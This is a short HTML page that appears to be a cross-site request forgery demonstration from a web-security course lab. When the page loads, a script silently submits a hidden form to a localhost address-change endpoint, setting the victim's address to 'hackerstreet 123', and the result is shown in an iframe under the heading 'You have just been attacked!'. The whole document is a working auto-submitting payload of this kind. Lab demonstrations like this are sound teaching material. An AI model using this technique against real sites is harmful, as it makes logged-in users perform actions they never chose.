<html>
<body>
    <h1>You have just been attacked!</h1>
    <h2>See here how it went:</h2>
    <iframe style="min-width:70%; min-height:400px;" name="csrf-iframe"></iframe>
    <form action="http://localhost/EITF05-WebSecurity/change_adress.php" method="POST" target="csrf-iframe" id="csrf-form" >
        <input type="hidden" name="homeadress" value="hackerstreet 123"></input>
        <script>document.getElementById("csrf-form").submit()</script>
    </form>
</body>
</html>